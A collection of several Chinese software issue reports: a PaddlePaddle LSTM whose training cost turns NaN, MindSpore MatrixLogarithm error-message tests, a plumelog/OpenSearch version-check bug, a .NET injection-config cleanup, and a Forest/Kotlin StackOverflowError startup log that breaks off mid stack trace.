lstm 训练的时候cost nan了,"数据：一些网页的title提取后取汉语部分。每个分类10W+的量 class:三分类 网络结构： 参数选择： 调整了learning_rate 和gradient_clipping_threshold 没起作用。   <code>: def stacked_lstm_net(input_dim, class_dim=2, emb_dim=128, hid_dim=512, stacked_num=5): assert stacked_num % 2 == 1 fc_para_attr = paddle.attr.Param(learning_rate=1e-3) lstm_para_attr = paddle.attr.Param(initial_std=0., learning_rate=1.) para_attr = [fc_para_attr, lstm_para_attr] bias_attr = paddle.attr.Param(initial_std=0., l2_rate=0.) relu = paddle.activation.Relu() brelu = paddle.activation.BRelu() tanh = paddle.activation.Tanh() linear = paddle.activation.Linear() data = paddle.layer.data(""x"", paddle.data_type.integer_value_sequence(input_dim)) emb = paddle.layer.embedding(input=data, size=emb_dim) fc1 = paddle.layer.fc( input=emb, size=hid_dim, act=brelu, bias_attr=bias_attr) lstm1 = paddle.layer.lstmemory(input=fc1, act=tanh, bias_attr=bias_attr) inputs = [fc1, lstm1] for i in range(2, stacked_num + 1): fc = paddle.layer.fc( input=inputs, size=hid_dim, act=brelu, param_attr=para_attr, bias_attr=bias_attr) lstm = paddle.layer.lstmemory( input=fc, reverse=(i % 2) == 0, act=tanh, bias_attr=bias_attr) inputs = [fc, lstm] fc_last = paddle.layer.pooling( input=inputs[0], pooling_type=paddle.pooling.Max()) lstm_last = paddle.layer.pooling( input=inputs[1], pooling_type=paddle.pooling.Max()) output = paddle.layer.fc( input=[fc_last, lstm_last], size=class_dim, act=paddle.activation.Softmax(), layer_attr=paddle.attr.ExtraLayerAttribute( error_clipping_threshold=10.0 ), bias_attr=bias_attr, param_attr=para_attr) lbl = paddle.layer.data(""y"", paddle.data_type.integer_value(1)) cost = paddle.layer.classification_cost(input=output, label=lbl) return cost, output, lbl cost, prob, label = stacked_lstm_net( input_dim=len(meta[0]), class_dim=3, emb_dim=word_dim, hid_dim=512, stacked_num=3, ) optimizer = paddle.optimizer.Adam( learning_rate=0.00001, gradient_clipping_threshold=2, regularization=paddle.optimizer.L2Regularization(rate=0.00001), model_average=paddle.optimizer.ModelAverage(average_window=0.5) ) word_dim = min(meta[-1], 200)"
[CT][MS][MatrixLogarithm]some error message need to be optimized,"部分异常场景里报错信息有待优化 / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 给出清晰明确的报错信息 1.当输入的后两维不相等时， 报错信息里参数名不正确，提示信息也不合理 2.输入非tensor时， 建议优先校验类型是否正确   <code>: def test_matrixlogarithm_input_not_tensor(): input_x = (1, 2, 3) net = MatrixLogarithm() fact = AnyNetFactory(net) with pytest.raises(TypeError): fact(input_x) def test_matrixlogarithm_input_not_square_matrix(): input_x = Tensor(np.random.randn(7, 4, 3) + 1j * np.random.randn(7, 4, 3), dtype=mstype.complex64) fact = MatrixLogarithmMock(inputs=[input_x]) with pytest.raises(ValueError): fact.forward_mindspore_impl() def test_matrixlogarithm_input_not_square_matrix(): input_x = Tensor(np.random.randn(7, 4, 3) + 1j * np.random.randn(7, 4, 3), dtype=mstype.complex64) fact = MatrixLogarithmMock(inputs=[input_x]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: For primitive[MatrixLogarithm], the attribute[the inner two dimension] must be equal to 4, but got 3. E def test_matrixlogarithm_input_not_tensor(): input_x = (1, 2, 3) net = MatrixLogarithm() fact = AnyNetFactory(net) # with pytest.raises(TypeError): &gt; fact(input_x) E ValueError: For primitive[MatrixLogarithm], the x rank must be greater than or equal to 2, but got 0."
v3.5重构的initAbstractServerClient()方法，导致不再兼容opensearch,"es异常如下： v3.5重构的initAbstractServerClient()方法，导致不再兼容opensearch，v3.4.2没有问题。 问题原因 判断了es版本，而opensearch版本为1.x，对应的却是elasticsearch 7.x ... 解决方案 我将为此提供一个PR，采用判断   <code>: { ""error"": { ""root_cause"": [{ ""type"": ""mapper_parsing_exception"", ""reason"": ""Root mapping definition has unsupported parameters: [plumelog : {properties={traceId={type=keyword}, dtTime={format=strict_date_optional_time||epoch_millis, type=date}, logLevel={type=keyword}, appNameWithEnv={type=keyword}, appName={type=keyword}, serverName={type=keyword}, env={type=keyword}, seq={type=long}}}]"" }], ""type"": ""mapper_parsing_exception"", ""reason"": ""Failed to parse mapping [_doc]: Root mapping definition has unsupported parameters: [plumelog : {properties={traceId={type=keyword}, dtTime={format=strict_date_optional_time||epoch_millis, type=date}, logLevel={type=keyword}, appNameWithEnv={type=keyword}, appName={type=keyword}, serverName={type=keyword}, env={type=keyword}, seq={type=long}}}]"", ""caused_by"": { ""type"": ""mapper_parsing_exception"", ""reason"": ""Root mapping definition has unsupported parameters: [plumelog : {properties={traceId={type=keyword}, dtTime={format=strict_date_optional_time||epoch_millis, type=date}, logLevel={type=keyword}, appNameWithEnv={type=keyword}, appName={type=keyword}, serverName={type=keyword}, env={type=keyword}, seq={type=long}}}]"" } }, ""status"": 400 } @Bean public AbstractServerClient initAbstractServerClient() { if(InitConfig.LITE_MODE_NAME.equals(model)){ logger.info(""当前启动模式为单机简易版！""); return new LuceneClient(InitConfig.LITE_MODE_LOG_PATH); } if (StringUtils.isEmpty(esHosts)) { logger.error(""can not find esHosts config ! please check the application.properties(plumelog.es.esHosts) ""); return null; } ElasticLowerClient elasticLowerClient = ElasticLowerClient.getInstance(esHosts, esUserName, esPassWord, trustSelfSigned, hostnameVerification); String esVersion = elasticLowerClient.getVersion(); logger.info(""es 初始化成功！Elastic 版本：{}"", esVersion); if (esVersion != null &amp;&amp; Integer.parseInt(esVersion.split(""\\."")[0]) &lt; 7) { InitConfig.esVersion=Integer.parseInt(esVersion.split(""\\."")[0]); logger.info(""set index type=plumelog""); this.indexType = ""plumelog""; LogMessageConstant.ES_TYPE= ""plumelog""; } return elasticLowerClient; } lucene_version"
 简化 `.AddInject()` 和 `.UseInject` 配置,"在框架中所有的 和 都提供了后置配置，但是配置的设计使用起来出现了回调地狱，使用非常不便，所以进行改造。 相关资料 编写更新日志内容 期望效果 !563: 简化 `.AddInject()` 和 `.UseInject` 配置   <code>: .AddInject .UseInject() AddInject() UseInject() Inject public void ConfigureServices(IServiceCollection services) { services.AddInject(options =&gt; { options.ConfigureSwaggerGen(gen =&gt; { // ... }); }); } public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { app.UseInject(configure: options =&gt; { options.ConfigureSwagger(swg =&gt; { // ... }); options.ConfigureSwaggerUI(ui =&gt; { // ... }); }); }"
FactoryBean threw exception on object creation; nested exception is java.lang.StackOverflowError,"Forest: 1.5.21 Backend: (okhttp或httpclient)/version 默认没改过 该问题是如何引起的？ 新建的Kotlin Gradle项目 JDK11 启动就报错了 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供）   <code>: import org.jetbrains.kotlin.gradle.tasks.KotlinCompile plugins { id(""org.springframework.boot"") version ""2.7.0"" id(""io.spring.dependency-management"") version ""1.0.11.RELEASE"" kotlin(""jvm"") version ""1.6.21"" kotlin(""plugin.spring"") version ""1.6.21"" } group = ""com.example"" version = ""0.0.1-SNAPSHOT"" java.sourceCompatibility = JavaVersion.VERSION_11 repositories { mavenCentral() } dependencies { implementation(""org.springframework.boot:spring-boot-starter"") implementation(""org.jetbrains.kotlin:kotlin-reflect"") implementation(""org.jetbrains.kotlin:kotlin-stdlib-jdk8"") testImplementation(""org.springframework.boot:spring-boot-starter-test"") implementation(""org.springframework.boot:spring-boot-starter-web"") implementation(""com.dtflys.forest:forest-spring-boot-starter:1.5.21"") } tasks.withType&lt;KotlinCompile&gt; { kotlinOptions { freeCompilerArgs = listOf(""-Xjsr305=strict"") jvmTarget = ""11"" } } tasks.withType&lt;Test&gt; { useJUnitPlatform() } package com.example.forest.controller import com.example.forest.client.Tencent import org.springframework.beans.factory.annotation.Autowired import org.springframework.http.MediaType import org.springframework.web.bind.annotation.GetMapping import org.springframework.web.bind.annotation.RequestMapping import org.springframework.web.bind.annotation.RestController import java.time.Instant @RestController @RequestMapping(""tencent"") class TenController { @Autowired lateinit var tencent: Tencent @GetMapping(""qr"", produces = [MediaType.IMAGE_JPEG_VALUE]) fun qr(): ByteArray { val timestamp = Instant.now() return tencent.qqLoginQr(timestamp.epochSecond.toString()) } } ""D:\Program Files-all\Java\jdk-11.0.12\bin\java.exe"" -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -javaagent:D:\jetbrains\apps\idea-u\ch-0\221.5591.52\lib\idea_rt.jar=63197:D:\jetbrains\apps\IDEA-U\ch-0\221.5591.52\bin -Dfile.encoding=UTF-8 -classpath D:\Study\Kotlin\forest\build\classes\kotlin\main;D:\Study\Kotlin\forest\build\resources\main;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-starter-web\2.7.0\7bf2381d030023970b5375c1090545e480467aa1\spring-boot-starter-web-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-starter\2.7.0\64fd3c21486dd20df9a62566599337dae2eb62cc\spring-boot-starter-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains.kotlin\kotlin-reflect\1.6.21\5dc3574d9b7bebfcb4ec6b10ada4aaa9e140bd0b\kotlin-reflect-1.6.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains.kotlin\kotlin-stdlib-jdk8\1.6.21\eeb4d60d75e9ea9c11200d52974e522793b14fba\kotlin-stdlib-jdk8-1.6.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.dtflys.forest\forest-spring-boot-starter\1.5.21\d9aace8e1225be99710c96eb33fc29a39277a73c\forest-spring-boot-starter-1.5.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-starter-json\2.7.0\f7120f4a6fd5dd2ca2128061e420e45ae2294943\spring-boot-starter-json-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-starter-tomcat\2.7.0\b8e5cd8cd4bf3935a68468fe32fe2e7550f96b8a\spring-boot-starter-tomcat-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-webmvc\5.3.20\8ac1b72a1f5c41fdc2cb3340cd94f795af260301\spring-webmvc-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-web\5.3.20\3c2fe9363760d62d5b7c9f087bb4255e3377a0b2\spring-web-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-autoconfigure\2.7.0\483f9a66d0e8326583c5054038d0aa0a95045dc3\spring-boot-autoconfigure-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot\2.7.0\df8bd106d6c6a6494b787b71d23cef6d2dc73703\spring-boot-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-starter-logging\2.7.0\5ff2a55d345ad824f39d55eaa32203865a92b30f\spring-boot-starter-logging-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\jakarta.annotation\jakarta.annotation-api\1.3.5\59eb84ee0d616332ff44aba065f3888cf002cd2d\jakarta.annotation-api-1.3.5.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-core\5.3.20\4b88aa3c401ede3d6c8ac78ea0c646cf326ec24b\spring-core-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.yaml\snakeyaml\1.30\8fde7fe2586328ac3c68db92045e1c8759125000\snakeyaml-1.30.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains.kotlin\kotlin-stdlib\1.6.21\11ef67f1900634fd951bad28c53ec957fabbe5b8\kotlin-stdlib-1.6.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains.kotlin\kotlin-stdlib-jdk7\1.6.21\568c1b78a8e17a4f35b31f0a74e2916095ed74c2\kotlin-stdlib-jdk7-1.6.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.dtflys.forest\forest-core\1.5.21\50ba573c6f8b7ec5c5aae3e58688cda9ae17ca87\forest-core-1.5.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.dtflys.forest\forest-spring\1.5.21\c1f317b0bea13fc65f5a7cf2d75297a78a93bcfd\forest-spring-1.5.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework.boot\spring-boot-configuration-processor\2.7.0\d8b66c3d68ff21cb10bb908cd873c4a6ecd8880f\spring-boot-configuration-processor-2.7.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.google.protobuf\protobuf-java\3.14.0\bb6430f70647fc349fffd1690ddb889dc3ea6699\protobuf-java-3.14.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.datatype\jackson-datatype-jsr310\2.13.3\ad2f4c61aeb9e2a8bb5e4a3ed782cfddec52d972\jackson-datatype-jsr310-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.module\jackson-module-parameter-names\2.13.3\f71c4ecc1a403787c963f68bc619b78ce1d2687b\jackson-module-parameter-names-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.datatype\jackson-datatype-jdk8\2.13.3\d4884595d5aab5babdb00ddbd693b8fd36b5ec3c\jackson-datatype-jdk8-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.core\jackson-databind\2.13.3\56deb9ea2c93a7a556b3afbedd616d342963464e\jackson-databind-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.tomcat.embed\tomcat-embed-websocket\9.0.63\c0bedf7bad4c0552e1805b2bc802604171c64146\tomcat-embed-websocket-9.0.63.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.tomcat.embed\tomcat-embed-core\9.0.63\f427a282d02439570f1e2af2c00376d4188c5291\tomcat-embed-core-9.0.63.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.tomcat.embed\tomcat-embed-el\9.0.63\b595f0bdae0392c8b3c8592fea10023956a3f619\tomcat-embed-el-9.0.63.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-context\5.3.20\517a42165221ea944c8b794154c10b69c0128281\spring-context-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-aop\5.3.20\c82f17997ab18ecafa8d08ce34a7c7aa4a04ef9e\spring-aop-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-beans\5.3.20\ab88bd9e3a8307f5c0516c15d295c88ec318659\spring-beans-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-expression\5.3.20\20e179f0dfabf0a46428f22c2150c9c4850fd15d\spring-expression-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\ch.qos.logback\logback-classic\1.2.11\4741689214e9d1e8408b206506cbe76d1c6a7d60\logback-classic-1.2.11.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.logging.log4j\log4j-to-slf4j\2.17.2\17dd0fae2747d9a28c67bc9534108823d2376b46\log4j-to-slf4j-2.17.2.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.slf4j\jul-to-slf4j\1.7.36\ed46d81cef9c412a88caef405b58f93a678ff2ca\jul-to-slf4j-1.7.36.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.springframework\spring-jcl\5.3.20\35119231d09863699567ce579c21512ddcbc5407\spring-jcl-5.3.20.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains.kotlin\kotlin-stdlib-common\1.6.21\5e5b55c26dbc80372a920aef60eb774b714559b8\kotlin-stdlib-common-1.6.21.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.jetbrains\annotations\13.0\919f0dfe192fb4e063e7dacadee7f8bb9a2672a9\annotations-13.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.squareup.okhttp3\okhttp\4.9.3\b0b14b3d12980912723fb8b66afb48dcda742fcb\okhttp-4.9.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.googlecode.juniversalchardet\juniversalchardet\1.0.3\cd49678784c46aa8789c060538e0154013bb421b\juniversalchardet-1.0.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.httpcomponents\httpclient-cache\4.5.13\4abee263cbc9edc12393212ca3a7c89af0755b1f\httpclient-cache-4.5.13.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.httpcomponents\httpmime\4.5.13\efc110bad4a0d45cda7858e6beee1d8a8313da5a\httpmime-4.5.13.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.httpcomponents\httpclient\4.5.13\e5f6cae5ca7ecaac1ec2827a9e2d65ae2869cada\httpclient-4.5.13.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.httpcomponents\httpcore\4.4.15\7f2e0c573eaa7a74bac2e89b359e1f73d92a0a1d\httpcore-4.4.15.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.google.code.findbugs\jsr305\3.0.1\f7be08ec23c21485b9b5a1cf1654c2ec8c58168d\jsr305-3.0.1.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.glassfish.jaxb\jaxb-runtime\2.3.6\1e6cd0e5d9f9919c8c8824fb4d310b09a978a60e\jaxb-runtime-2.3.6.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\commons-io\commons-io\2.7\3f2bd4ba11c4162733c13cc90ca7c7ea09967102\commons-io-2.7.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.slf4j\slf4j-api\1.7.36\6c62681a2f655b49963a5983b8b0950a6120ae14\slf4j-api-1.7.36.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.core\jackson-annotations\2.13.3\7198b3aac15285a49e218e08441c5f70af00fc51\jackson-annotations-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.fasterxml.jackson.core\jackson-core\2.13.3\a27014716e4421684416e5fa83d896ddb87002da\jackson-core-2.13.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\ch.qos.logback\logback-core\1.2.11\a01230df5ca5c34540cdaa3ad5efb012f1f1f792\logback-core-1.2.11.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.apache.logging.log4j\log4j-api\2.17.2\f42d6afa111b4dec5d2aea0fe2197240749a4ea6\log4j-api-2.17.2.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.squareup.okio\okio\2.8.0\49b64e09d81c0cc84b267edd0c2fd7df5a64c78c\okio-jvm-2.8.0.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\commons-logging\commons-logging\1.2\4bfc12adfe4842bf07b657f0369c4cb522955686\commons-logging-1.2.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\commons-codec\commons-codec\1.15\49d94806b6e3dc933dacbd8acb0fdbab8ebd1e5d\commons-codec-1.15.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\jakarta.xml.bind\jakarta.xml.bind-api\2.3.3\48e3b9cfc10752fba3521d6511f4165bea951801\jakarta.xml.bind-api-2.3.3.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\org.glassfish.jaxb\txw2\2.3.6\45db7b69a8f1ec2c21eb7d4fc0ee729f53c1addc\txw2-2.3.6.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.sun.istack\istack-commons-runtime\3.0.12\cbbe1a62b0cc6c85972e99d52aaee350153dc530\istack-commons-runtime-3.0.12.jar;C:\Users\hello\.gradle\caches\modules-2\files-2.1\com.sun.activation\jakarta.activation\1.2.2\74548703f9851017ce2f556066659438019e7eb5\jakarta.activation-1.2.2.jar com.example.forest.ForestApplicationKt . ____ _ __ _ _ /\\ / ___'_ __ _ _(_)_ __ __ _ \ \ \ \ ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \ \\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v2.7.0) 2022-05-24 23:12:27.659 INFO 15320 --- [ main] com.example.forest.ForestApplicationKt : Starting ForestApplicationKt using Java 11.0.12 on DESKTOP-3081IPJ with PID 15320 (D:\Study\Kotlin\forest\build\classes\kotlin\main started by hello in D:\Study\Kotlin\forest) 2022-05-24 23:12:27.661 INFO 15320 --- [ main] com.example.forest.ForestApplicationKt : No active profile set, falling back to 1 default profile: ""default"" 2022-05-24 23:12:28.175 INFO 15320 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean '(inner bean)#12aa4996' of type [com.dtflys.forest.config.SpringForestProperties] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-05-24 23:12:28.176 INFO 15320 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean '(inner bean)#2ca5f1ed' of type [com.dtflys.forest.reflection.SpringForestObjectFactory] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-05-24 23:12:28.176 INFO 15320 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean '(inner bean)#58e92c23' of type [com.dtflys.forest.interceptor.SpringInterceptorFactory] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-05-24 23:12:28.186 INFO 15320 --- [ main] c.d.f.scanner.ClassPathClientScanner : [Forest] Created Forest Client Bean with name 'tencent' and Proxy of 'com.example.forest.client.Tencent' client interface 2022-05-24 23:12:28.360 INFO 15320 --- [ main] o.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat initialized with port(s): 8080 (http) 2022-05-24 23:12:28.367 INFO 15320 --- [ main] o.apache.catalina.core.StandardService : Starting service [Tomcat] 2022-05-24 23:12:28.368 INFO 15320 --- [ main] org.apache.catalina.core.StandardEngine : Starting Servlet engine: [Apache Tomcat/9.0.63] 2022-05-24 23:12:28.457 INFO 15320 --- [ main] o.a.c.c.C.[Tomcat].[localhost].[/] : Initializing Spring embedded WebApplicationContext 2022-05-24 23:12:28.457 INFO 15320 --- [ main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 758 ms 2022-05-24 23:12:28.758 WARN 15320 --- [ main] ConfigServletWebServerApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'tenController': Unsatisfied dependency expressed through field 'tencent'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'tencent': FactoryBean threw exception on object creation; nested exception is java.lang.StackOverflowError 2022-05-24 23:12:28.760 INFO 15320 --- [ main] o.apache.catalina.core.StandardService : Stopping service [Tomcat] 2022-05-24 23:12:28.768 INFO 15320 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2022-05-24 23:12:28.786 ERROR 15320 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'tenController': Unsatisfied dependency expressed through field 'tencent'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'tencent': FactoryBean threw exception on object creation; nested exception is java.lang.StackOverflowError at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:659) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:639) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1431) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:619) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:953) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) ~[spring-context-5.3.20.jar:5.3.20] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) ~[spring-context-5.3.20.jar:5.3.20] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147) ~[spring-boot-2.7.0.jar:2.7.0] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:734) ~[spring-boot-2.7.0.jar:2.7.0] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:408) ~[spring-boot-2.7.0.jar:2.7.0] at org.springframework.boot.SpringApplication.run(SpringApplication.java:308) ~[spring-boot-2.7.0.jar:2.7.0] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1306) ~[spring-boot-2.7.0.jar:2.7.0] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1295) ~[spring-boot-2.7.0.jar:2.7.0] at com.example.forest.ForestApplicationKt.main(ForestApplication.kt:13) ~[main/:na] Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'tencent': FactoryBean threw exception on object creation; nested exception is java.lang.StackOverflowError at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.doGetObjectFromFactoryBean(FactoryBeanRegistrySupport.java:176) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.FactoryBeanRegistrySupport.getObjectFromFactoryBean(FactoryBeanRegistrySupport.java:101) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.getObjectForBeanInstance(AbstractBeanFactory.java:1884) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getObjectForBeanInstance(AbstractAutowireCapableBeanFactory.java:1284) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:267) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1614) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1571) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1352) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1309) ~[spring-beans-5.3.20.jar:5.3.20] at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:656) ~[spring-beans-5.3.20.jar:5.3.20] ... 20 common frames omitted Caused by: java.lang.StackOverflowError: null at java.base/java.util.concurrent.ConcurrentHashMap.get(ConcurrentHashMap.java:936) ~[na:na] at java.base/java.lang.ClassLoader.definePackage(ClassLoader.java:2089) ~[na:na] at java.base/java.lang.ClassLoader.definePackage(ClassLoader.java:2072) ~[na:na] at java.base/java.lang.Class.getPackage(Class.java:967) ~[na:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:302) ~[forest-core-1.5.21.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.21.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~[forest-core-1.5.21.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) 